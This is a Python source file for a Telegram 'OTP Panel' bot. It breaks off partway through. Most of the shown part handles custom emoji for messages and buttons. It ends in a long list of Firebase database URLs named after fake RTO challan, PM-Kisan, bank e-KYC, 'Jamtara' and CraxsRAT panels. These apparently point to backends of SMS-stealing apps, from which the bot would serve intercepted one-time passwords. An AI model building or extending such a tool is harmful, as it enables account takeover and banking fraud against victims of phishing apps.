#!/usr/bin/env python3
"""
══════════════════════════════════════════════════════
        OTP PANEL BOT — ACCESS CONTROLLED EDITION
  Panel-wise Numbers + Access System + Emoji Names
══════════════════════════════════════════════════════
"""

import os
import re
import gc
import time
import json
import asyncio
import hashlib
import logging
from datetime import datetime, timedelta
from typing import Optional
from html import escape

import aiohttp
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton
from telegram.error import Conflict, Forbidden, TelegramError
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes,
)

# ═══════════════════════════════════════════════════════
#  PREMIUM CUSTOM EMOJI UI
#  Telegram custom emoji IDs supplied by the owner.
#  Text uses <tg-emoji>; inline buttons use the Bot API
#  icon_custom_emoji_id field through PTB api_kwargs so this
#  remains usable with python-telegram-bot v22.5.
# ═══════════════════════════════════════════════════════

PREMIUM_EMOJI_IDS = (
    "5224607267797606837",
    "5404561694510833322",
    "6206446249181189526",
    "5206318837489743801",
    "5235588635885054955",
    "6206479140040743133",
    "5440621591387980068",
    "5246772116543512028",
    "5253742260054409879",
    "5339233635620899144",
    "6206497372176913599",
    "6206404510689007446",
    "6204162490515855272",
    "5372849966689566579",
    "6206174450765796040",
    "5339286072876614251",
)

_PREMIUM_INDEX = 0
_PTB_INLINE_KEYBOARD_BUTTON = None

logging.basicConfig(
    format="%(asctime)s — %(name)s — %(levelname)s — %(message)s",
    level=logging.WARNING,
)


# Keep the original PTB class under a private alias.
_PTB_INLINE_KEYBOARD_BUTTON = InlineKeyboardButton

def premium_emoji(emoji_id: Optional[str] = None, fallback: str = "⭐️") -> str:
    """Return a Telegram custom emoji entity for HTML messages."""
    global _PREMIUM_INDEX
    if emoji_id is None:
        emoji_id = PREMIUM_EMOJI_IDS[_PREMIUM_INDEX % len(PREMIUM_EMOJI_IDS)]
        _PREMIUM_INDEX += 1
    return f'<tg-emoji emoji-id="{emoji_id}">{fallback}</tg-emoji>'


# ── Emoji sanitizer: strip ALL non-premium emoji from inline button text ──
_EMOJI_RANGES = (
    (0x1F000, 0x1FAFF),
    (0x2600, 0x27BF),
    (0x1F1E6, 0x1F1FF),
    (0x2B00, 0x2BFF),
    (0xFE00, 0xFE0F),
    (0x1F900, 0x1F9FF),
    (0xE0020, 0xE007F),
)
# NOTE: 0x2000-0x206F (dashes, bullets, quotes, ellipsis) and 0x2190-0x21FF
# (plain arrows like ->) are deliberately NOT treated as emoji so that normal
# punctuation in messages survives untouched.
_EMOJI_SINGLE = {0x3030, 0x303D, 0x2139, 0x200D, 0x20E3, 0xFE0F}


def _is_emoji_char(ch: str) -> bool:
    cp = ord(ch)
    if cp in _EMOJI_SINGLE:
        return True
    for lo, hi in _EMOJI_RANGES:
        if lo <= cp <= hi:
            return True
    return False


def strip_emoji(text: str) -> str:
    """Remove emoji / pictographs / symbols from a string."""
    cleaned = "".join(ch for ch in (text or "") if not _is_emoji_char(ch))
    cleaned = re.sub(r"\s{2,}", " ", cleaned).strip()
    cleaned = re.sub(r"^[/|:\-\u2013\u2014\s]+", "", cleaned)
    cleaned = re.sub(r"[/|:\-\u2013\u2014\s]+$", "", cleaned)
    return cleaned.strip()


# ── Premium emoji upgrade map (verified via getCustomEmojiStickers) ──
PREMIUM_EMOJI_MAP = {
    "\u2604": "5224607267797606837",
    "\u2604\ufe0f": "5224607267797606837",
    "\U0001F4B8": "5404561694510833322",
    "\U0001F50D": "6206446249181189526",
    "\U0001F4AF": "5206318837489743801",
    "\U0001F3B2": "5235588635885054955",
    "\u2714": "6206479140040743133",
    "\u2714\ufe0f": "6206479140040743133",
    "\U0001F51C": "5440621591387980068",
    "\u26D4": "5246772116543512028",
    "\u26D4\ufe0f": "5246772116543512028",
    "\u2709": "5253742260054409879",
    "\u2709\ufe0f": "5253742260054409879",
    "\U0001F517": "6206497372176913599",
    "\u2B50": "6206404510689007446",
    "\u2B50\ufe0f": "6206404510689007446",
    "\u270F": "6204162490515855272",
    "\u270F\ufe0f": "6204162490515855272",
    "\U0001F6F8": "5372849966689566579",
    "\u26A0": "6206174450765796040",
    "\u26A0\ufe0f": "6206174450765796040",
    "\u270B": "5339286072876614251",
    "\u270B\ufe0f": "5339286072876614251",
    # Extra common emoji -> nearest verified premium icon.
    "\u2705": "6206479140040743133",          # ✅ -> premium ✔️
    "\u274C": "5246772116543512028",          # ❌ -> premium ⛔️
    "\u26A1": "5224607267797606837",          # ⚡ -> premium ☄️
    "\u2728": "6206404510689007446",          # ✨ -> premium ⭐️
    "\u2753": "6206174450765796040",          # ❓ -> premium ⚠️
    "\u2726": "6206404510689007446",          # ✦  -> premium ⭐️
    "\U0001F525": "5224607267797606837",      # 🔥 -> premium ☄️
    "\U0001F680": "5372849966689566579",      # 🚀 -> premium ✈️
    "\U0001F4E7": "5253742260054409879",      # 📧 -> premium ✉️
    "\U0001F4E8": "5253742260054409879",      # 📨 -> premium ✉️
    "\U0001F4E4": "5372849966689566579",      # 📤 -> premium ✈️
    "\U0001F512": "5339286072876614251",      # 🔒 -> premium ✋
    "\U0001F513": "5339286072876614251",      # 🔓 -> premium ✋
    "\U0001F6AB": "5246772116543512028",      # 🚫 -> premium ⛔️
    "\U0001F4A1": "6206404510689007446",      # 💡 -> premium ⭐️
    "\U0001F4CA": "5206318837489743801",      # 📊 -> premium 💯
    "\U0001F4C8": "5206318837489743801",      # 📈 -> premium 💯
    "\U0001F4C9": "5206318837489743801",      # 📉 -> premium 💯
    "\U0001F3AF": "5235588635885054955",      # 🎯 -> premium 🎲
    "\U0001F3C6": "5206318837489743801",      # 🏆 -> premium 💯
    "\U0001F4B0": "5404561694510833322",      # 💰 -> premium 💸
    "\U0001F4B5": "5404561694510833322",      # 💵 -> premium 💸
    "\U0001F4B4": "5404561694510833322",      # 💴 -> premium 💸
    "\U0001F4B6": "5404561694510833322",      # 💶 -> premium 💸
    "\U0001F4B7": "5404561694510833322",      # 💷 -> premium 💸
    "\U0001F4B3": "5404561694510833322",      # 💳 -> premium 💸
    "\U0001F381": "5440621591387980068",      # 🎁 -> premium 🔜
    "\U0001F389": "5440621591387980068",      # 🎉 -> premium 🔜
    "\U0001F4AC": "5253742260054409879",      # 💬 -> premium ✉️
    "\U0001F4DD": "6204162490515855272",      # 📝 -> premium ✏️
    "\U0001F4CB": "6204162490515855272",      # 📋 -> premium ✏️
    "\U0001F4C4": "6204162490515855272",      # 📄 -> premium ✏️
    "\U0001F4C1": "6206497372176913599",      # 📁 -> premium 🔗
    "\U0001F4BE": "6206497372176913599",      # 💾 -> premium 🔗
    "\U0001F4E6": "6206497372176913599",      # 📦 -> premium 🔗
    "\U0001F517": "6206497372176913599",      # 🔗 -> premium 🔗
    "\U0001F511": "6206497372176913599",      # 🔑 -> premium 🔗
    "\U0001F510": "5339286072876614251",      # 🔐 -> premium ✋
    "\U0001F6E1": "6206479140040743133",      # 🛡 -> premium ✔️
    "\U0001F6A8": "6206174450765796040",      # 🚨 -> premium ⚠️
    "\U0001F465": "6206446249181189526",      # 👥 -> premium 🔍
    "\U0001F464": "6206446249181189526",      # 👤 -> premium 🔍
    "\U0001F50E": "6206446249181189526",      # 🔎 -> premium 🔍
    "\U0001F4BB": "6204162490515855272",      # 💻 -> premium ✏️
    "\U0001F5A5": "6204162490515855272",      # 🖥 -> premium ✏️
    "\U0001F310": "6206497372176913599",      # 🌐 -> premium 🔗
    "\U0001F4F1": "5253742260054409879",      # 📱 -> premium ✉️
    "\U0001F4F2": "5253742260054409879",      # 📲 -> premium ✉️
    "\U0001F504": "5235588635885054955",      # 🔄 -> premium 🎲
    "\U0001F5D1": "5246772116543512028",      # 🗑 -> premium ⛔️
    "\U0001F527": "6204162490515855272",      # 🔧 -> premium ✏️
    "\U0001F528": "6204162490515855272",      # 🔨 -> premium ✏️
    "\U0001F6E0": "6204162490515855272",      # 🛠 -> premium ✏️
    "\U0001F44D": "6206479140040743133",      # 👍 -> premium ✔️
    "\U0001F44E": "5246772116543512028",      # 👎 -> premium ⛔️
    "\U0001F4A5": "5224607267797606837",      # 💥 -> premium ☄️
    "\U0001F4A3": "5224607267797606837",      # 💣 -> premium ☄️
    "\U0001F947": "5206318837489743801",      # 🥇 -> premium 💯
    "\U0001F4B9": "5206318837489743801",      # 💹 -> premium 💯
    "\U0001F4B2": "5404561694510833322",      # 💲 -> premium 💸
    "\U0001F550": "5440621591387980068",      # 🕐 -> premium 🔜
    "\u231A": "5440621591387980068",          # ⌚ -> premium 🔜
    "\U0001F4C5": "6204162490515855272",      # 📅 -> premium ✏️
    "\U0001F4C6": "6204162490515855272",      # 📆 -> premium ✏️
    "\U0001F4CD": "6206497372176913599",      # 📍 -> premium 🔗
    "\U0001F4CE": "6206497372176913599",      # 📎 -> premium 🔗
    "\U0001F4D1": "6204162490515855272",      # 📑 -> premium ✏️
    "\U0001F4D6": "6204162490515855272",      # 📖 -> premium ✏️
    "\U0001F4DA": "6204162490515855272",      # 📚 -> premium ✏️
    "\U0001F4E2": "5253742260054409879",      # 📢 -> premium ✉️
    "\U0001F4E3": "5253742260054409879",      # 📣 -> premium ✉️
    "\U0001F514": "6206174450765796040",      # 🔔 -> premium ⚠️
    "\U0001F515": "6206174450765796040",      # 🔕 -> premium ⚠️
    "\U0001F6AA": "6206497372176913599",      # 🚪 -> premium 🔗
    "\U0001F6A9": "6206174450765796040",      # 🚩 -> premium ⚠️
    "\U0001F3F3": "6206174450765796040",      # 🏳 -> premium ⚠️
    "\U0001F3F4": "6206174450765796040",      # 🏴 -> premium ⚠️
    "\U0001F9F9": "6204162490515855272",      # 🧹 -> premium ✏️
    "\U0001F9F0": "6204162490515855272",      # 🧰 -> premium ✏️
    "\U0001F9EA": "5235588635885054955",      # 🧪 -> premium 🎲
    "\U0001F9EC": "5235588635885054955",      # 🧬 -> premium 🎲
    "\U0001F4A4": "5440621591387980068",      # 💤 -> premium 🔜
    "\U0001F3AE": "5235588635885054955",      # 🎮 -> premium 🎲
    "\U0001F3B5": "5440621591387980068",      # 🎵 -> premium 🔜
    "\U0001F3B6": "5440621591387980068",      # 🎶 -> premium 🔜
    "\U0001F3A8": "5235588635885054955",      # 🎨 -> premium 🎲
    "\U0001F30D": "6206497372176913599",      # 🌍 -> premium 🔗
    "\U0001F30E": "6206497372176913599",      # 🌎 -> premium 🔗
    "\U0001F30F": "6206497372176913599",      # 🌏 -> premium 🔗
    "\U0001F319": "5440621591387980068",      # 🌙 -> premium 🔜
    "\u2600": "5224607267797606837",          # ☀ -> premium ☄️
    "\u2600\ufe0f": "5224607267797606837",
    "\u2601": "6206174450765796040",          # ☁ -> premium ⚠️
    "\u2601\ufe0f": "6206174450765796040",
    "\u2614": "5404561694510833322",          # ☔ -> premium 💸
    "\u2615": "5440621591387980068",          # ☕ -> premium 🔜
    "\u267B": "6206479140040743133",          # ♻ -> premium ✔️
    "\u267B\ufe0f": "6206479140040743133",
    "\u2693": "6206497372176913599",          # ⚓ -> premium 🔗
    "\u2694": "5224607267797606837",          # ⚔ -> premium ☄️
    "\u2694\ufe0f": "5224607267797606837",
    "\u2696": "6206479140040743133",          # ⚖ -> premium ✔️
    "\u2696\ufe0f": "6206479140040743133",
    "\u2699": "5235588635885054955",          # ⚙ -> premium 🎲
    "\u2699\ufe0f": "5235588635885054955",
    "\u26AB": "5246772116543512028",          # ⚫ -> premium ⛔️
    "\u26AB\ufe0f": "5246772116543512028",
    "\u26D3": "6206497372176913599",          # ⛓ -> premium 🔗
    "\u26D3\ufe0f": "6206497372176913599",
    "\u27A1": "6206497372176913599",          # ➡ -> premium 🔗
    "\u27A1\ufe0f": "6206497372176913599",
    "\u2B05": "6206497372176913599",          # ⬅ -> premium 🔗
    "\u2B05\ufe0f": "6206497372176913599",
    "\u2B06": "6206497372176913599",          # ⬆ -> premium 🔗
    "\u2B06\ufe0f": "6206497372176913599",
    "\u2B07": "6206497372176913599",          # ⬇ -> premium 🔗
    "\u2B07\ufe0f": "6206497372176913599",
    "\u2795": "6206479140040743133",          # ➕ -> premium ✔️
    "\u2796": "5246772116543512028",          # ➖ -> premium ⛔️
    "\u2716": "5246772116543512028",          # ✖ -> premium ⛔️
    "\u2716\ufe0f": "5246772116543512028",
    "\u2733": "6206404510689007446",          # ✳ -> premium ⭐️
    "\u2733\ufe0f": "6206404510689007446",
    "\u2734": "6206404510689007446",          # ✴ -> premium ⭐️
    "\u2734\ufe0f": "6206404510689007446",
    "\u2747": "6206404510689007446",          # ❇ -> premium ⭐️
    "\u2747\ufe0f": "6206404510689007446",
    "\u2744": "5224607267797606837",          # ❄ -> premium ☄️
    "\u2744\ufe0f": "5224607267797606837",
    "\u2764": "6206404510689007446",          # ❤ -> premium ⭐️
    "\u2764\ufe0f": "6206404510689007446",
    "\U0001F495": "6206404510689007446",      # 💕 -> premium ⭐️
    "\U0001F496": "6206404510689007446",      # 💖 -> premium ⭐️
    "\U0001F497": "6206404510689007446",      # 💗 -> premium ⭐️
    "\U0001F49A": "6206404510689007446",      # 💚 -> premium ⭐️
    "\U0001F499": "6206404510689007446",      # 💙 -> premium ⭐️
    "\U0001F49B": "6206404510689007446",      # 💛 -> premium ⭐️
    "\U0001F49C": "6206404510689007446",      # 💜 -> premium ⭐️
    "\U0001F5A4": "5246772116543512028",      # 🖤 -> premium ⛔️
    "\U0001F494": "5246772116543512028",      # 💔 -> premium ⛔️
    "\U0001F620": "6206174450765796040",      # 😠 -> premium ⚠️
    "\U0001F621": "6206174450765796040",      # 😡 -> premium ⚠️
    "\U0001F600": "6206479140040743133",      # 😀 -> premium ✔️
    "\U0001F601": "6206479140040743133",      # 😁 -> premium ✔️
    "\U0001F602": "6206479140040743133",      # 😂 -> premium ✔️
    "\U0001F60A": "6206479140040743133",      # 😊 -> premium ✔️
    "\U0001F642": "6206479140040743133",      # 🙂 -> premium ✔️
    "\U0001F44C": "6206479140040743133",      # 👌 -> premium ✔️
    "\U0001F64F": "6206479140040743133",      # 🙏 -> premium ✔️
    "\U0001F4AA": "6206479140040743133",      # 💪 -> premium ✔️
    "\U0001F440": "6206446249181189526",      # 👀 -> premium 🔍
    "\U0001F9E0": "5235588635885054955",      # 🧠 -> premium 🎲
    "\U0001F4A2": "6206174450765796040",      # 💢 -> premium ⚠️
    "\U0001F4A8": "5440621591387980068",      # 💨 -> premium 🔜
    "\U0001F32A": "6206174450765796040",      # 🌪 -> premium ⚠️
    "\U0001F32A\ufe0f": "6206174450765796040",
    "\U0001F525": "5224607267797606837",
    "\u2708": "5372849966689566579",          # ✈ -> premium ✈️
    "\u2708\ufe0f": "5372849966689566579",
    "\U0001F6F8": "5372849966689566579",      # 🛸 -> premium ✈️
    "\U0001F6EB": "5372849966689566579",      # 🛫 -> premium ✈️
    "\U0001F6EC": "5372849966689566579",      # 🛬 -> premium ✈️
    "\U0001F697": "5372849966689566579",      # 🚗 -> premium ✈️
    "\U0001F3CD": "5372849966689566579",      # 🏍 -> premium ✈️
    "\U0001F6B2": "5372849966689566579",      # 🚲 -> premium ✈️
    "\U0001F4E1": "6206446249181189526",      # 📡 -> premium 🔍
    "\U0001F5B1": "6204162490515855272",      # 🖱 -> premium ✏️
    "\u2328": "6204162490515855272",          # ⌨ -> premium ✏️
    "\u2328\ufe0f": "6204162490515855272",
    "\U0001F4BD": "6206497372176913599",      # 💽 -> premium 🔗
    "\U0001F4BF": "6206497372176913599",      # 💿 -> premium 🔗
    "\U0001F4C0": "6206497372176913599",      # 📀 -> premium 🔗
    "\U0001F9F1": "6206497372176913599",      # 🧱 -> premium 🔗
    "\U0001F3E0": "6206497372176913599",      # 🏠 -> premium 🔗
    "\U0001F3E2": "6206497372176913599",      # 🏢 -> premium 🔗
    "\U0001F3AD": "5235588635885054955",      # 🎭 -> premium 🎲
    "\U0001F3C1": "6206174450765796040",      # 🏁 -> premium ⚠️
    "\U0001F3F8": "5235588635885054955",      # 🏸 -> premium 🎲
    "\u26BD": "5235588635885054955",          # ⚽ -> premium 🎲
    "\u26BE": "5235588635885054955",          # ⚾ -> premium 🎲
    "\u26F3": "5235588635885054955",          # ⛳ -> premium 🎲
    "\U0001F3B3": "5235588635885054955",      # 🎳 -> premium 🎲
    "\U0001F3AF": "5235588635885054955",      # 🎯 -> premium 🎲
    "\U0001F9E9": "5235588635885054955",      # 🧩 -> premium 🎲
    "\U0001F9F8": "5440621591387980068",      # 🧸 -> premium 🔜
    "\U0001F381": "5440621591387980068",      # 🎁 -> premium 🔜
    "\U0001F38A": "5440621591387980068",      # 🎊 -> premium 🔜
    "\U0001F386": "5440621591387980068",      # 🎆 -> premium 🔜
    "\U0001F387": "5440621591387980068",      # 🎇 -> premium 🔜
    "\U0001F942": "5440621591387980068",      # 🥂 -> premium 🔜
    "\U0001F37E": "5440621591387980068",      # 🍾 -> premium 🔜
    "\U0001F36A": "5440621591387980068",      # 🍪 -> premium 🔜
    "\U0001F369": "5440621591387980068",      # 🍩 -> premium 🔜
    "\U0001F355": "5440621591387980068",      # 🍕 -> premium 🔜
    "\u2615": "5440621591387980068",          # ☕ -> premium 🔜
    "\U0001F37A": "5440621591387980068",      # 🍺 -> premium 🔜
    "\U0001F377": "5440621591387980068",      # 🍷 -> premium 🔜
    "\U0001F34E": "5440621591387980068",      # 🍎 -> premium 🔜
    "\U0001F34C": "5440621591387980068",      # 🍌 -> premium 🔜
    "\U0001F352": "5440621591387980068",      # 🍒 -> premium 🔜
    "\U0001F351": "5440621591387980068",      # 🍑 -> premium 🔜
    "\U0001F95C": "5440621591387980068",      # 🥜 -> premium 🔜
    "\U0001F4A7": "5404561694510833322",      # 💧 -> premium 💸
    "\U0001F30A": "5404561694510833322",      # 🌊 -> premium 💸
    "\U0001F525": "5224607267797606837",
}

# Longest keys first so multi-codepoint emoji win over their base char.
_PREMIUM_KEYS = sorted(PREMIUM_EMOJI_MAP.keys(), key=len, reverse=True)


_EMOJI_CLUSTER_RE = re.compile(
    r"(?:[\U0001F1E6-\U0001F1FF]{2})"
    r"|(?:"
    r"[\U0001F000-\U0001FAFF\u2600-\u27BF\u2B00-\u2BFF\u3030\u303D\u2139]"
    r"(?:\uFE0F|\u20E3)?"
    r"(?:[\U0001F3FB-\U0001F3FF])?"
    r"(?:\u200D[\U0001F000-\U0001FAFF\u2600-\u27BF\u2B00-\u2BFF](?:\uFE0F)?)*"
    r")",
    re.UNICODE,
)

# Blocks that must never be touched (Telegram rejects nested custom emoji in
# code/pre and we must not corrupt link targets).
_PROTECT_RE = re.compile(
    r"(<tg-emoji[^>]*>.*?</tg-emoji>|<code>.*?</code>|<pre>.*?</pre>|<a\s[^>]*>.*?</a>)",
    re.S,
)


def _premium_for(cluster: str) -> str:
    """Return a premium <tg-emoji> for an emoji cluster (stable mapping)."""
    base = cluster.replace("\uFE0F", "")
    eid = PREMIUM_EMOJI_MAP.get(cluster) or PREMIUM_EMOJI_MAP.get(base)
    if not eid:
        # Deterministic fallback: same emoji always -> same premium icon.
        eid = PREMIUM_EMOJI_IDS[sum(ord(c) for c in cluster) % len(PREMIUM_EMOJI_IDS)]
    # Keep the original cluster as the visible fallback so ZWJ sequences and
    # flags render correctly if a client cannot show the custom emoji.
    return f'<tg-emoji emoji-id="{eid}">{cluster}</tg-emoji>'


def premiumize_text(text: str) -> str:
    """Upgrade every emoji in a message to a premium <tg-emoji> entity.

    Only call this for HTML parse_mode messages. Existing premium blocks,
    <code>, <pre> and <a> blocks are left untouched.
    """
    if not text:
        return text
    parts = _PROTECT_RE.split(text)
    for i, part in enumerate(parts):
        if i % 2 == 1:  # protected block
            continue
        part = _EMOJI_CLUSTER_RE.sub(lambda m: _premium_for(m.group(0)), part)
        parts[i] = part
    out = "".join(parts)
    out = re.sub(r"[ \t]{2,}", " ", out)
    out = re.sub(r"\n{3,}", "\n\n", out)
    return out

# ── Global premium hook: premiumize every outgoing HTML message ──
def _install_premium_hooks() -> None:
    """Wrap Bot send/edit methods so every HTML text/caption is premiumized."""
    from telegram import Bot

    _HTML = ("HTML", "html")

    def _wrap(orig, field, pos):
        async def wrapper(self, *args, **kwargs):
            try:
                if kwargs.get("parse_mode") in _HTML:
                    if isinstance(kwargs.get(field), str):
                        kwargs[field] = premiumize_text(kwargs[field])
                    elif len(args) > pos and isinstance(args[pos], str):
                        a = list(args)
                        a[pos] = premiumize_text(a[pos])
                        args = tuple(a)
            except Exception:
                pass
            return await orig(self, *args, **kwargs)

        wrapper.__name__ = getattr(orig, "__name__", "wrapped")
        wrapper._premium_hooked = True
        return wrapper

    targets = (
        ("send_message", "text", 1),
        ("edit_message_text", "text", 0),
        ("send_photo", "caption", 2),
        ("send_document", "caption", 2),
        ("send_video", "caption", 2),
        ("send_animation", "caption", 2),
        ("send_audio", "caption", 2),
        ("edit_message_caption", "caption", 0),
    )
    for name, field, pos in targets:
        orig = getattr(Bot, name, None)
        if orig is None or getattr(orig, "_premium_hooked", False):
            continue
        setattr(Bot, name, _wrap(orig, field, pos))


_install_premium_hooks()


def premium_button(
    text: str,
    *args,
    emoji_id: Optional[str] = None,
    fallback_emoji: str = "",
    style: str = None,
    **kwargs
):
    """Inline button with Premium custom-emoji icon and Bot API style.

    Existing calls remain compatible: premium_button(text, callback_data=...).
    """
    global _PREMIUM_INDEX

    old_emoji_id = kwargs.pop("icon_custom_emoji_id", None)
    if emoji_id is None:
        emoji_id = old_emoji_id

    if emoji_id is None and PREMIUM_EMOJI_IDS:
        emoji_id = PREMIUM_EMOJI_IDS[_PREMIUM_INDEX % len(PREMIUM_EMOJI_IDS)]
        _PREMIUM_INDEX += 1

    # Always guarantee a PREMIUM custom emoji icon.
    if emoji_id is None and PREMIUM_EMOJI_IDS:
        emoji_id = PREMIUM_EMOJI_IDS[_PREMIUM_INDEX % len(PREMIUM_EMOJI_IDS)]
        _PREMIUM_INDEX += 1

    # Remove every non-premium emoji from the visible button label.
    text = strip_emoji(text) or "Button"

    api_kwargs = dict(kwargs.pop("api_kwargs", {}) or {})

    if emoji_id:
        api_kwargs["icon_custom_emoji_id"] = emoji_id

    # Default every inline button to Telegram's primary style.
    # Explicit success/danger values override it.
    selected_style = style if style in ("primary", "success", "danger") else "primary"
    api_kwargs["style"] = selected_style

    return _PTB_INLINE_KEYBOARD_BUTTON(
        text, *args, api_kwargs=api_kwargs, **kwargs
    )

# ═══════════════════════════════════════════════════════
#  CONFIG (UPDATED: REMOVED ALPHA_A23 AND RND12_17508)
# ═══════════════════════════════════════════════════════

DEFAULT_DATABASES = {
    "👑 BOSS_R1": "https://rexxx-4c7a7-default-rtdb.firebaseio.com",
    "👑 BOSS_R2": "https://runjun-master-panel-default-rtdb.firebaseio.com",
    "⚡ ALPHA_A2": "https://rto9-d2b33-default-rtdb.firebaseio.com",
    "🔥 ALPHA_A5": "https://challan-758d1-default-rtdb.asia-southeast1.firebasedatabase.app",
    "⚔️ ALPHA_A12": "https://fir-1fa16-default-rtdb.firebaseio.com",
    "🎯 ALPHA_A19": "https://u40179853-987df-default-rtdb.firebaseio.com",
    "🔫 ALPHA_A21": "https://u62803313-e54bc-default-rtdb.firebaseio.com",
    "🦾 ALPHA_A24": "https://u67583339-bf0c1-default-rtdb.firebaseio.com",
    "🏹 ALPHA_A27": "https://u8208372-ad1d1-default-rtdb.firebaseio.com",
    "🌪 ALPHA_A29": "https://u25428732-91bd9-default-rtdb.firebaseio.com",
    "💥 ALPHA_A31": "https://u72749819-fa563-default-rtdb.firebaseio.com",
    "🩸 ALPHA_A32": "https://u24143844-c1b11-default-rtdb.firebaseio.com",
    "👹 ALPHA_A33": "https://u72328193-47b68-default-rtdb.firebaseio.com",
    "🎭 ALPHA_A34": "https://u58325342-dffc0-default-rtdb.firebaseio.com",
    "⛓ ALPHA_A35": "https://u75887828-b5a63-default-rtdb.firebaseio.com",
    "🧿 ALPHA_A36": "https://u24153206-5eef6-default-rtdb.firebaseio.com",
    "💵 MAFIA_M7": "https://rto-47-b39f4-default-rtdb.firebaseio.com",
    "💰 MAFIA_M15_1": "https://chfjfj-c2857-default-rtdb.firebaseio.com",
    "💎 MAFIA_M15_2": "https://ai-rto-9-default-rtdb.firebaseio.com",
    "✨ VIP_EXTRA": "https://s85138920-87594-default-rtdb.firebaseio.com",
    "📦 FORTY_DATA": "https://fortydata-fee65-default-rtdb.firebaseio.com",
    "📡 FPRO_INDUS": "https://fpro3indus-default-rtdb.firebaseio.com",
    "🚨 JAMTARA_181": "https://jamtara181-default-rtdb.firebaseio.com",
    "🛸 PMS_JDJ": "https://pmsjdj-default-rtdb.firebaseio.com",
    "💻 MY_CARRY": "https://cs6mycarry68jh-default-rtdb.firebaseio.com",
    "🃏 RANDI_RONA": "https://randi-rona-81876-default-rtdb.firebaseio.com",
    "🚔 RTO_CHALLAN_A": "https://rtochallan-8579d-default-rtdb.firebaseio.com",
    "🛑 RTO_CHALLAN_B": "https://rtochallan8-default-rtdb.firebaseio.com",
    "🐾 JAMTARA_140": "https://jamtara140-73bf7-default-rtdb.firebaseio.com",
    "🔮 GGGGGG_NODE": "https://gggggg-979bd-default-rtdb.firebaseio.com",
    # ── Naye Panels ──────────────────────────────────────
    "🟣 CSFORME_DC64A": "https://csforme-dc64a-default-rtdb.firebaseio.com",
    "🔵 SANJEE_9918A": "https://sanjee-9918a-default-rtdb.firebaseio.com",
    "🟤 BITTU_2D39E": "https://bittu-2d39e-default-rtdb.firebaseio.com",
    "😈 DEMON_4": "https://demon-4-default-rtdb.firebaseio.com",
    "🐕 DOGLA_DE225": "https://dogla-de225-default-rtdb.firebaseio.com",
    "🎲 RANDO_ACF5A": "https://rando-acf5a-default-rtdb.firebaseio.com",
    "🅰️ AAAA_B3749": "https://aaaa-b3749-default-rtdb.firebaseio.com",
    "🧩 AJAY_33C1B": "https://ajay-33c1b-default-rtdb.firebaseio.com",
    "🌾 PM_KISAN_13GFH": "https://pm-kisan-13gfh-default-rtdb.firebaseio.com",
    "6️⃣ SERVER_6_42C3B": "https://server-6-42c3b-default-rtdb.firebaseio.com",
    "🌱 PM_KISHAN_23GUG": "https://pm-kishan-23gug-default-rtdb.firebaseio.com",
    "🔛 GO_ONE_1B6B2": "https://go-one-1b6b2-default-rtdb.firebaseio.com",
    "♻️ RC_39_15": "https://rc-39-15-default-rtdb.firebaseio.com",
    "📋 PANEL_WALA_V70": "https://panel-wala-v70-default-rtdb.firebaseio.com",
    "🌀 UDKUDJUDJ": "https://udkudjudj-default-rtdb.firebaseio.com",
    "🌐 YOURFIREBASE": "https://yourfirebase-default-rtdb.firebaseio.com",
    "👨 RAJ254346KUMAR": "https://raj254346kumar-84033-default-rtdb.firebaseio.com",
    "📋 PANEL_WALA_V11": "https://panel-wala-v11-default-rtdb.firebaseio.com",
    "🦀 CRAXS_4C542": "https://craxs-4c542-default-rtdb.firebaseio.com",
    "⛓ U75887828_B5A63": "https://u75887828-b5a63-default-rtdb.firebaseio.com",
    "👁 AJNA_20FC4": "https://ajna-20fc4-default-rtdb.firebaseio.com",
    "🙏 RAMESHWAR_7OKT": "https://rameshwar-7okt-default-rtdb.firebaseio.com",
    "📱 MYAPP_8228A": "https://myapp-8228a-default-rtdb.firebaseio.com",
    "🏆 E5TURNAMENT2": "https://e5turnament2-default-rtdb.firebaseio.com",
    "🌊 RAKI143AA": "https://raki143aa-default-rtdb.firebaseio.com",
    "🚗 RTO91_2B27F": "https://rto91-2b27f-default-rtdb.firebaseio.com",
    "😫 PAINISLV": "https://painislv-default-rtdb.firebaseio.com",
    "⚡ SHOWN SPECIAL": "https://flash-v8enginepower-default-rtdb.firebaseio.com",
    "🍆 LODA_5029E": "https://loda-5029e-default-rtdb.firebaseio.com",
    "⚓ ANKUR_2511F": "https://ankur-2511f-default-rtdb.firebaseio.com",
    "🔷 U62751482_F5B46": "https://u62751482-f5b46-default-rtdb.firebaseio.com",
    "🔥 FIR_27C9E": "https://fir-27c9e-default-rtdb.firebaseio.com",
    "☁️ KUMARLIVE1": "https://kumarlive1-default-rtdb.firebaseio.com",
   "ADMIN_822E2": "https://admin-822e2-default-rtdb.firebaseio.com",
   "AJNA_20FC4": "https://ajna-20fc4-default-rtdb.firebaseio.com",
   "APKDRIOD": "https://apkdriod-default-rtdb.firebaseio.com",
   "AJAY_33C1B": "https://ajay-33c1b-default-rtdb.firebaseio.com",
   "ASDTEST_PROJECT": "https://asdtest-project-default-rtdb.firebaseio.com",
   "BANDHAN2_7JAN": "https://bandhan2-7jan-default-rtdb.firebaseio.com",
   "BANK_E_KYC": "https://bank-e-kyc-default-rtdb.firebaseio.com",
   "CHFJFJ_C2857": "https://chfjfj-c2857-default-rtdb.firebaseio.com",
   "CAN_4_668A0": "https://can-4-668a0-default-rtdb.firebaseio.com",
   "CHHNUK05_3188E": "https://chhnuk05-3188e-default-rtdb.firebaseio.com",
   "BUSINESS_APPS_BA1_8D27C": "https://business-apps-ba1-8d27c-default-rtdb.firebaseio.com",
   "CSFORME_DC64A": "https://csforme-dc64a-default-rtdb.firebaseio.com",
   "DARK_274B4": "https://dark-274b4-default-rtdb.firebaseio.com",
   "GGGGGG_979BD": "https://gggggg-979bd-default-rtdb.firebaseio.com",
   "FIRES_847DA": "https://fires-847da-default-rtdb.firebaseio.com",
   "FPRO3INDUS": "https://fpro3indus-default-rtdb.firebaseio.com",
   "BUSINESS_APPS_BA1_F86B7": "https://business-apps-ba1-f86b7-default-rtdb.firebaseio.com",
   "HSM2PRO21": "https://hsm2pro21-default-rtdb.firebaseio.com",
   "INDUS_1_CEC4F": "https://indus-1-cec4f-default-rtdb.firebaseio.com",
   "IMDUM_6E873": "https://imdum-6e873-default-rtdb.firebaseio.com",
   "IPL2025_62676": "https://ipl2025-62676-default-rtdb.firebaseio.com",
